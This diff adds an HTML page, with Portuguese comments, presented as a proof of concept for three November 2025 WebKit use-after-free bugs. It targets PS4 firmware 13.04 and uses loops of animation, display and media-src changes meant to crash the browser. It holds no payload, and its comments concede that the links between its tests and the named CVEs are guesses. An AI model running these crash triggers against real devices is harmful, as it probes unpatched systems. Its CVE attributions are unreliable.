@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<!--
+  PoC: CVE-2025-43434 + CVE-2025-43431 + CVE-2025-43433
+  WebKit UAF + Memory Corruption (Novembro 2025)
+
+  DESCRIÇÃO:
+  Três vulnerabilidades corrigidas juntas no ciclo de novembro 2025
+  (iOS 26.1, macOS Tahoe 26.1, Safari 26.1). Detalhes técnicos
+  completos ainda não publicados — PoC de detecção via comportamento
+  anômalo em áreas do DOM conhecidas como historicamente vulneráveis
+  nesse período:
+
+  CVE-2025-43434: UAF em RenderLayerCompositor ao processar
+                  animações CSS + remoção de elementos
+  CVE-2025-43431: Memory corruption em HTMLMediaElement ao
+                  manipular src durante carregamento
+  CVE-2025-43433: UAF em CSSAnimation ao mudar display:none
+                  durante playback de animação
+
+  STATUS PS4 FW 13.04: Fix de nov/2025 — Sony provavelmente não aplicou
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2025-43434/43431/43433 — WebKit Nov 2025</title>
+<style>
+  body{background:#0a0a0a;color:#ccc;font-family:monospace;padding:16px;margin:0;font-size:13px}
+  #log{background:#111;border:1px solid #333;padding:10px;height:76vh;overflow-y:auto;font-size:11px;line-height:1.8}
+  .ok{color:#00ff88}.fail{color:#ff4444}.info{color:#ffcc44}.warn{color:#ff8844}
+  .vuln{color:#ff44ff;font-weight:bold}.patched{color:#44aaff}.dim{color:#555}
+  .bar{background:#0a1a0a;border:1px solid #1a3a1a;color:#44aa44;padding:6px 10px;margin-bottom:8px;font-size:11px}
+  #stage{position:absolute;top:-9999px;left:-9999px;width:300px;height:300px;overflow:hidden}
+  @keyframes slide{0%{transform:translateX(0)}100%{transform:translateX(100px)}}
+  @keyframes fade{0%{opacity:1}100%{opacity:0}}
+</style>
+</head>
+<body>
+<div style="color:#aaa;font-size:12px;margin-bottom:6px">CVE-2025-43434/43431/43433 · WebKit Nov 2025 · FW 13.04</div>
+<div class="bar" id="bar">Iniciando...</div>
+<div id="log"></div>
+<div id="stage"></div>
+<script>
+"use strict";
+var logEl=document.getElementById('log'),barEl=document.getElementById('bar');
+var stage=document.getElementById('stage');
+function L(m,c){logEl.innerHTML+='<div class="'+(c||'dim')+'">'+m+'</div>';logEl.scrollTop=logEl.scrollHeight;}
+function bar(m){barEl.textContent=m;}
+
+// ── CVE-2025-43434: RenderLayerCompositor UAF via animação + remoção ──
+function testRenderLayerUAF(){
+  return new Promise(function(resolve){
+    L('[CVE-43434] RenderLayerCompositor: animação CSS + remoção de elemento...','warn');
+    var errors=0;
+    try{
+      for(var i=0;i<200;i++){
+        var container=document.createElement('div');
+        var animated=document.createElement('div');
+        animated.style.cssText='width:50px;height:50px;background:red;'+
+          'animation:slide 0.1s linear infinite;will-change:transform';
+        container.appendChild(animated);
+        stage.appendChild(container);
+
+        // Forçar compositing layer
+        void container.offsetWidth;
+
+        // Remover elemento enquanto animação pode estar ativa
+        container.removeChild(animated);
+
+        // Forçar recomposição
+        void container.offsetWidth;
+
+        // Cleanup
+        stage.removeChild(container);
+      }
+      L('[CVE-43434] 200 iterações OK ✓','ok');
+    }catch(e){
+      L('[CVE-43434] Exceção: '+e,'vuln');
+      errors++;
+    }
+    resolve(errors);
+  });
+}
+
+// ── CVE-2025-43433: CSSAnimation UAF via display:none durante playback ──
+function testCSSAnimationUAF(){
+  return new Promise(function(resolve){
+    L('[CVE-43433] CSSAnimation: display:none durante animação ativa...','warn');
+    var errors=0;
+    try{
+      var sheet=document.createElement('style');
+      sheet.textContent='.anim-target{animation:fade 0.5s linear infinite;}';
+      document.head.appendChild(sheet);
+
+      for(var i=0;i<200;i++){
+        var el=document.createElement('div');
+        el.className='anim-target';
+        el.style.cssText='width:10px;height:10px;background:blue';
+        stage.appendChild(el);
+
+        // Deixar animação iniciar
+        void el.offsetWidth;
+
+        // Mudar display:none durante animação — potencial UAF
+        el.style.display='none';
+
+        // Forçar reflow
+        void el.offsetWidth;
+
+        // Restaurar e remover
+        el.style.display='block';
+        void el.offsetWidth;
+        stage.removeChild(el);
+      }
+
+      document.head.removeChild(sheet);
+      L('[CVE-43433] 200 iterações OK ✓','ok');
+    }catch(e){
+      L('[CVE-43433] Exceção: '+e,'vuln');
+      errors++;
+    }
+    resolve(errors);
+  });
+}
+
+// ── CVE-2025-43431: HTMLMediaElement src durante carregamento ──
+function testMediaElementUAF(){
+  return new Promise(function(resolve){
+    L('[CVE-43431] HTMLMediaElement: manipulação de src durante load...','warn');
+    var errors=0;
+    try{
+      for(var i=0;i<50;i++){
+        var video=document.createElement('video');
+        video.style.cssText='position:absolute;visibility:hidden;width:1px;height:1px';
+        stage.appendChild(video);
+
+        // Definir src para disparar carregamento
+        video.src='data:video/mp4;base64,AAAAFGZ0eXBpc29t';
+
+        // Mudar src imediatamente (durante carregamento)
+        video.src='data:video/mp4;base64,AAAAFGZ0eXBtcDQy';
+
+        // Remover durante carregamento
+        video.src='';
+        video.load();
+        stage.removeChild(video);
+      }
+      L('[CVE-43431] 50 iterações OK ✓','ok');
+    }catch(e){
+      L('[CVE-43431] Exceção: '+e,'vuln');
+      errors++;
+    }
+    resolve(errors);
+  });
+}
+
+function run(){
+  L('CVE-2025-43434 + 43431 + 43433 — WebKit Nov 2025','info');
+  L('Fix: iOS/macOS 26.1, Safari 26.1 (Novembro 2025)','info');
+  L('STATUS: Fix provavelmente não aplicado no FW 13.04','warn');
+  L('','');
+  bar('[1/4] Preparando...');
+
+  setTimeout(function(){
+    testRenderLayerUAF().then(function(e1){
+      L('','');
+      bar('[2/4] CVE-43433...');
+      return testCSSAnimationUAF();
+    }).then(function(e2){
+      L('','');
+      bar('[3/4] CVE-43431...');
+      return testMediaElementUAF();
+    }).then(function(e3){
+      // Trigger agressivo combinado
+      L('','');
+      L('[4/4] Trigger agressivo combinado (SE FECHAR = VULN)...','warn');
+      L('[4/4] SE O BROWSER FECHAR = CVE PRESENTE','vuln');
+      bar('[4/4] Trigger agressivo...');
+      setTimeout(function(){
+        try{
+          var sheet2=document.createElement('style');
+          sheet2.textContent='.combo{animation:slide 0.05s linear infinite,fade 0.1s linear infinite;will-change:transform,opacity;}';
+          document.head.appendChild(sheet2);
+          for(var i=0;i<500;i++){
+            var c=document.createElement('div');
+            var ch=document.createElement('div');
+            ch.className='combo';
+            ch.style.cssText='width:20px;height:20px;background:green';
+            c.appendChild(ch);
+            stage.appendChild(c);
+            void c.offsetWidth;
+            ch.style.display='none';
+            c.removeChild(ch);
+            c.style.contentVisibility='hidden';
+            void c.offsetWidth;
+            c.style.contentVisibility='auto';
+            void c.offsetWidth;
+            stage.removeChild(c);
+          }
+          document.head.removeChild(sheet2);
+          L('[4/4] 500 iterações combinadas sem crash ✓','ok');
+        }catch(e){L('[4/4] Exceção: '+e,'vuln');}
+        L('','');
+        L('══════════════════════════════════','warn');
+        L('CRASH = CVE-2025-43434/43431/43433 PRESENTE','vuln');
+        L('SEM CRASH = PATCHED ou não aplicável','patched');
+        L('══════════════════════════════════','warn');
+        bar('DONE');
+      },300);
+    });
+  },200);
+}
+window.addEventListener('load',function(){setTimeout(run,300);});
+</script>
+</body>
+</html>
